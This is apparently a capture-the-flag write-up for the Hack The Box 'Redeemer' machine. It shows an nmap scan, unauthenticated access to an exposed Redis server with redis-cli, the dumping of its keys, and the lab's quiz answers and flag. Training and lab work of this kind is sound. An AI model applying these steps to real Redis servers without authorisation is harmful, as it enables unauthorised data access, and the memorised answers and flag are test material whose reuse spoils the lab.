# Redeemer

> IP: [10.129.63.189]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -T5 -p- 10.129.63.189 -oN init_scan
      1. Port 6379/tcp -> redis
         1. Redis key-value store 5.0.7
3. REDIS
   1. Redis is a non-relational database, and is based on `in-memory`
   2. > redis-cli --help
      1. -h is the host
   3. > redis-cli -h 10.129.63.189
      1. > INFO
         1. *See redis-info file for all data*
      2. > keys *
         1. "stor"
         2. "numb"
         3. "flag"
         4. "temp"
      3. > get flag
         1. `03e1d2b376c37ab3f5319922053953eb`

## QUESTIONS

1. Which TCP port is open on the machine?
   1. `6379`
2. Which service is running on the port that is open on the machine?
   1. `redis`
3. What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database
   1. `in-memory database`
4. Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
   1. `redis-cli`
5. Which flag is used with the Redis command-line utility to specify the hostname?
   1. `-h`
6. Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?
   1. `info`
7. What is the version of the Redis server being used on the target machine?
   1. `5.0.7`
8. Which command is used to select the desired database in Redis?
   1. `select`
9. How many keys are present inside the database with index 0?
   1. `4`
10. Which command is used to obtain all the keys in a database?
    1. `keys *`
11. Submit root flag
    1. `03e1d2b376c37ab3f5319922053953eb`
